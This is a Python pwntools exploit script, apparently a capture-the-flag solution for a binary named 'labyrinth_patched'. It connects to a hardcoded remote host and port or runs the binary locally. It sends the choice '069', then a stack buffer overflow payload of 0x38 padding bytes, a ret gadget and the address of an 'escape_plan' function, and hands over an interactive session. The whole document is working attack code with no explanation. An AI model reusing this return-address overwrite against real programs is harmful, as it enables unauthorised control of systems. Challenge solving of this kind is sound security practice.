#!/usr/bin/python3

from pwn import *
import argparse
from time import *


parser = argparse.ArgumentParser(description='Exploit script')
parser.add_argument('remote', nargs='?', default=None, help='Run the exploit on a remote server')
args = parser.parse_args()

exe = ELF('./labyrinth_patched', checksec=False)
#libc = ELF('./libc.so.6', checksec=False)
#ld = ELF('./ld-linux-x86-64.so.2', checksec=False)
#libc = exe.libc

#context.binary = exe
context.terminal = ['wt.exe','-d', '.', 'wsl.exe', '-d', 'Ubuntu-22.04']

info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)
sln = lambda msg, num: sla(msg, str(num).encode())
sn = lambda msg, num: sa(msg, str(num).encode())

def GDB():
    if args.remote is None:
        gdb.attach(p, gdbscript='''
        b* 0x00000000004015D5
        
        c
        ''')
        input()

if args.remote:
    p = remote('94.237.59.30',36382)  
else:
    p = process(exe.path)  

#GDB()

sl(b'069')
ret = 0x0000000000401016
pl = flat(
    b'a'*0x38,
    p32(ret),
    p32(0),
    p32(exe.sym.escape_plan),
    p32(0),
    
)
sl(pl)



p.interactive()
